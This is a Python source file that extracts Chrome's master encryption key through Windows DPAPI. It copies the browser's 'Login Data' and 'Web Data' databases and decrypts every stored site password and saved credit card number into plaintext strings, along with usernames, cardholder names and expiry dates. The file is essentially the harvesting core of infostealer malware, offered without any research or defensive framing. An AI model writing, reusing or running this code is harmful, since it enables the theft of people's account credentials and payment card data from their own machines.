import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime

FileName = 116444736000000000
NanoSeconds = 10000000


def ConvertDate(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')


def get_master_key(path):
    try:
        real_path = path.replace("\Default", "")
        with open(real_path + r'\Local State',
                  "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    except Exception as error:
        print(error)
        exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"


def get_password(path):
    try:
        master_key = get_master_key(path)
        login_db = path + r'\Login Data'
        try:
            shutil.copy2(login_db,
                         path + r'\Loginvault.db')  # making a temp copy since Login Data DB is locked while Chrome is running
        except Exception as error:
            print(error)
            pass
        conn = sqlite3.connect(path + r'\Loginvault.db')
        cursor = conn.cursor()

        passwords = ""

        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = decrypt_password(encrypted_password, master_key)
                if username != "" or decrypted_password != "":
                    passwords += "url: " + url + "\nusername: " + username + "\npassword: " + decrypted_password + "\n"
            return passwords
        except Exception as e:
            pass
    except:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove(login_db + r'\Loginvault.db')
    except Exception as e:
        pass


def get_credit_cards(path):
    master_key = get_master_key(path)
    login_db = path + '\Web Data'
    try:
        shutil.copy2(login_db,
                     "CCvault.db")  # making a temp copy since Login Data DB is locked while Chrome is running
    except:
        pass
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    ccs = ""

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            ccs += "Name in Card: " + username + "\nNumber: " + decrypted_password + "\nExpire Month: " + str(expire_mon) + "\nExpire Year: " + str(expire_year) + "\n" + "*" * 10 + "\n"
        return ccs
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except Exception as e:
        pass
